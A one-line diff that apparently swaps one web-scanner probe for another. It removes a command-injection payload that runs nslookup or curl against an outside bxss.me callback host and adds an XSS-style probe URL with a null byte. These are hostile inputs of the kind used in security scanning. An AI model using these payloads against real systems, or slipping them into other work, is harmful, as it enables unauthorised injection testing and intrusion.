@@ -1,1 +1,1 @@
-(nslookup -q=cname hitxdpcwtbcdg77e3b.bxss.me||curl hitxdpcwtbcdg77e3b.bxss.me))
+HttP://bxss.me/t/xss.html?%00
